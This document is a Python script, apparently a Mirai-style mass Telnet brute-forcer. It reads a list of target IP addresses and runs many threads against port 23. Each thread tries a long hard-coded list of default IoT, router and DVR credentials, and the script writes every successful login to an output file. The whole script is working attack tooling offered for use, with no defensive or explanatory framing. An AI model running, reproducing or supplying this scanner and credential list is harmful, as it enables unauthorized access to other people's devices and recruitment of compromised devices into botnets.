import threading
import sys, os, re, time, socket
from queue import *
from sys import stdout

global R,B,C,G,Y,Q
R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'

if len(sys.argv) < 4:
    print("Usage: python " + sys.argv[0] + " <list> <threads> <output file>")
    sys.exit()

combo = [ 
    "root:root", "admin:admin", "admin:ADMIN", "daemon:daemon", "root:vizxv", 
    "root:pass", "root:anko", "root:1234", "root:", "admin:", "root:xc3511", 
    "root:juantech", "default:", "default:default", "supervisor:zyad1234", 
    "root:5up", "default:lJwpbo6", "daemon:", "adm:", "root:696969", 
    "root:1234567", "User:admin", "guest:12345", "guest:password", 
    "root:zlxx.", "root:1001chin", "root:hunt5759", "admin:true", "admin:changeme", 
    "baby:baby", "root:xc3511", "root:xmhdipc", "root:12341234", "root:ttnet", 
    "root:Serv4EMC", "default:S2fGqNFs", "default:OxhlwSG8", "toor:root", 
    "root:toor", "default:lJwpbo6", "vstarcam2015:20150602", "root:zsun1188", 
    "admin:meinsm", "admin:adslnadam", "root:ipcam_rt5350", "Menara:Menara", 
    "admin:ho4uku6at", "root:t0talc0ntr0l4!", "admin:gvt12345", "admin:dvr2580222", 
    "root:hi3518", "root:ikwb", "admin:ip3000", "admin:1234", "admin:12345", 
    "telnet:telnet", "admin:1234567", "root:system", "admin:password", 
    "root:888888", "root:88888888", "root:klv1234", "root:Zte521", "root:hi3518", 
    "root:jvbzd", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:dreambox", 
    "root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:54321", 
    "admin:123456", "default:123456", "default:S2fGqNFs", "default:OxhlwSG8", 
    "default:antslq", "default:tlJwpbo6", "root:default", "default:pass", 
    "default:12345", "default:password", "root:taZz@23495859", "root:20080826", 
    "admin:7ujMko0admin", "root:gforge", "root:zsun1188", "admin:synnet", 
    "root:t0talc0ntr0l4!", "guest:1111", "root:admin1234", "root:tl789", 
    "admin:fliradmin", "root:12345678", "root:123456789", "root:1234567890", 
    "root:vertex25ektks123", "root:admin@mymifi", "admin:7ujMko0admin", 
    "admin:pass", "admin:meinsm", "admin:admin1234", "admin:smcadmin", 
    "root:1111", "admin:1111", "root:54321", "root:666666", "root:klv123", 
    "Administrator:admin", "service:service", "supervisor:supervisor", 
    "guest:12345", "admin1:password", "administrator:1234", "666666:666666", 
    "888888:888888", "tech:tech", "admin:dvr2580222", "ubnt:ubnt", "user:12345", 
    "admin:aquario", "root:zsun1188", "default:lJwpbo6", "ftp:ftp", 
    "hikvision:hikvision", "guest:guest", "guest:12345", "user:user", 
    "root:Zte521", "root:abc123", "root:admin", "root:xc3511", "root:Serv4EMC", 
    "root:zsun1188", "root:123456", "default:OxhlwSG8", "default:S2fGqNFs", 
    "admin:smcadmin", "admin:adslnadam", "sysadm:sysadm", "support:support", 
    "root:default", "root:password", "adm:", "bin:", "daemon:", "root:cat1029", 
    "admin:cat1029", "Alphanetworks:wrgg19_c_dlwbr_dir300", 
    "Alphanetworks:wrgn49_dlob_dir600b", "Alphanetworks:wrgn23_dlwbr_dir600b", 
    "Alphanetworks:wrgn22_dlwbr_dir615", "Alphanetworks:wrgnd08_dlob_dir815", 
    "Alphanetworks:wrgg15_di524", "Alphanetworks:wrgn39_dlob.hans_dir645", 
    "Alphanetworks:wapnd03cm_dkbs_dap2555", "Alphanetworks:wapnd04cm_dkbs_dap3525", 
    "Alphanetworks:wapnd15_dlob_dap1522b", "Alphanetworks:wrgac01_dlob.hans_dir865", 
    "Alphanetworks:wrgn23_dlwbr_dir300b", "Alphanetworks:wrgn28_dlob_dir412", 
    "Alphanetworks:wrgn39_dlob.hans_dir645_V1", "admin:123456", "mother:fucker", 
    "root:antslq",
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
debug = False
if len(sys.argv) > 4:
	debug = True
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%s-%s] Alvos: %d  |  @CirqueiraDev | Bruter Fixed!" %(Y,C,queue_count))
    stdout.flush()
    queue.put(ip)

class router(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        port = 23
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password = ""
            else:
                password = passwd.split(":")[1]
            if "n/a:" in passwd:
                username = ""
            else:
                username = passwd.split(":")[0]

            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip, port))
            except Exception as e:
                try:
                    tn.close()
                except:
                    pass
                break
            if debug:
                print(f'[DEBUG] Testando {self.ip} com {username}:{password}')

            try:
                hoho = readUntil(tn, "ogin")
                if "ogin" in hoho:
                    tn.send((username + "\n").encode())
                    time.sleep(0.09)
            except Exception as e:
                try: tn.close()
                except: pass
                continue

            try:
                hoho = readUntil(tn, "assword")
                if "assword" in hoho:
                    tn.send((password + "\n").encode())
                    time.sleep(0.8)
            except Exception as e:
                try: tn.close()
                except: pass
                continue

            try:
                prompt = tn.recv(40960).decode(errors='ignore')
                success = False
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif any(c in prompt for c in ["#", "$", "%", "@"]):
                    success = True
                if "failed" in prompt or "incorrect" in prompt or "invalid" in prompt or "ogin:" in prompt or "locked" in prompt or "rong" in prompt or "ailure" in prompt:
                    success = False

                if success:
                    with open(output_file, "a") as f:
                        f.write(f"{self.ip}:23 {username}:{password}\n")
                    print(f'{C}[{G}OK{C}] IP: {Y}{self.ip}{C}:{Y}{port}{C}  {B}{username}{C}:{B}{password}{C}')
                    try: tn.close()
                    except: pass
                    break
                else:
                    try: tn.close()
                    except: pass
            except Exception as e:
                try: tn.close()
                except: pass

def readUntil(tn, string, timeout=8):
    buf = b''
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            buf += tn.recv(1024)
            time.sleep(0.01)
            if string.encode() in buf:
                return buf.decode(errors='ignore')
        except:
            break
    raise Exception('TIMEOUT!')

def worker():
    while not queue.empty():
        try:
            IP = queue.get()
            thread = router(IP)
            thread.start()
            queue.task_done()
            time.sleep(0.5)
        except:
            pass

if __name__ == "__main__":
    print('\n[%s-%s] Testando alvos: %s | isso pode demorar um bastante...'%(Y,C,queue_count))
    for l in range(threads):
        try:
            t = threading.Thread(target=worker)
            t.start()
        except:
            pass
